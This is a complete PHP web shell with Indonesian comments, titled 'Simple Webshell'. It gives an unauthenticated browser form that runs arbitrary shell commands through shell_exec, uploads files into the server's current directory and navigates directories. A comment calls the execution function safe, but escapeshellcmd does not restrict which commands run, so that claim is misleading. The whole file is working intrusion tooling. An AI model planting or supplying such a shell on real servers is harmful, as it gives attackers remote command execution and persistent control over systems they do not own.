<?php
// Mulai session untuk melacak perubahan direktori
session_start();

// Fungsi untuk aman menjalankan perintah
function safeShellExec($command) {
    // Menghindari command injection
    return shell_exec(escapeshellcmd($command));
}

// Mengatur direktori saat ini berdasarkan sesi atau fallback ke root default
if (!isset($_SESSION['currentDir'])) {
    $_SESSION['currentDir'] = getcwd();  // Menggunakan direktori saat ini
}

// Menangani unggahan file
if (isset($_FILES['fileUpload'])) {
    $currentDir = $_SESSION['currentDir'];  // Direktori aktif dari session
    $target_file = $currentDir . "/" . basename($_FILES["fileUpload"]["name"]);
    
    if (move_uploaded_file($_FILES["fileUpload"]["tmp_name"], $target_file)) {
        $upload_message = "File " . htmlspecialchars(basename($_FILES["fileUpload"]["name"])) . " has been uploaded to the current directory.";
    } else {
        $upload_message = "Sorry, there was an error uploading your file.";
    }
}

// Perintah untuk mengganti direktori (cd)
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $output = "";

    // Jika perintah adalah cd
    if (strpos($cmd, "cd ") === 0) {
        $newDir = trim(substr($cmd, 3));  // Path baru dari perintah cd
        $currentDir = $_SESSION['currentDir'];  // Mendapatkan direktori aktif

        // Jika perintah adalah cd ..
        if ($newDir == "..") {
            $parentDir = dirname($currentDir);  // Mendapatkan direktori induk
            // Jika sudah di root, pastikan tetap di direktori awal
            if ($parentDir !== $currentDir) {
                $_SESSION['currentDir'] = $parentDir;
            }
            $output = "Directory changed to: " . $_SESSION['currentDir'];
        } else if (is_dir($newDir)) {
            // Jika folder yang disebutkan ada, lakukan cd ke folder tersebut
            $_SESSION['currentDir'] = realpath($newDir);
            $output = "Directory changed to: " . $_SESSION['currentDir'];
        } else {
            // Menampilkan error jika direktori tidak ada
            $output = "Directory does not exist: " . $newDir;
        }
    } else {
        // Sebelum menjalankan perintah lain, pastikan kita berada di direktori yang benar
        chdir($_SESSION['currentDir']); // Pindah ke direktori saat ini
        // Jalankan perintah shell selain cd
        $output = safeShellExec($cmd);
    }
}

// Mengambil lokasi direktori saat ini
$currentDir = $_SESSION['currentDir'];
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webshell with Upload and Directory Navigation</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            text-align: center;
        }
        .container {
            width: 60%;
            margin: auto;
            padding: 20px;
            background-color: white;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            margin-top: 50px;
            border-radius: 8px;
        }
        h1 {
            font-size: 24px;
            color: #333;
        }
        input[type="text"], input[type="file"] {
            width: 80%;
            padding: 10px;
            margin: 20px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #45a049;
        }
        pre {
            background-color: #f2f2f2;
            padding: 15px;
            border-radius: 5px;
            text-align: left;
            font-family: "Courier New", Courier, monospace;
            overflow-x: auto;
        }
        .upload-msg {
            font-size: 16px;
            color: green;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>Simple Webshell - File Upload and Directory Navigation</h1>
        
        <!-- Menampilkan direktori saat ini -->
        <h3>Current Directory: <?php echo $currentDir; ?></h3>

        <!-- Form untuk unggah file -->
        <form method="POST" enctype="multipart/form-data">
            <h2>Upload File</h2>
            <input type="file" name="fileUpload" required>
            <br>
            <button type="submit">Upload File</button>
        </form>

        <?php if (isset($upload_message)): ?>
            <div class="upload-msg"><?php echo $upload_message; ?></div>
        <?php endif; ?>

        <!-- Form untuk eksekusi perintah -->
        <form method="POST">
            <h2>Enter Command (e.g., `ls`, `cd /path/to/dir`)</h2>
            <input type="text" name="cmd" placeholder="Enter command..." value="<?php echo isset($cmd) ? htmlspecialchars($cmd) : ''; ?>" required>
            <br>
            <button type="submit">Execute Command</button>
        </form>
        
        <?php if (isset($output)): ?>
            <h3>Command Output:</h3>
            <pre><?php echo htmlspecialchars($output); ?></pre>
        <?php endif; ?>
    </div>

</body>
</html>
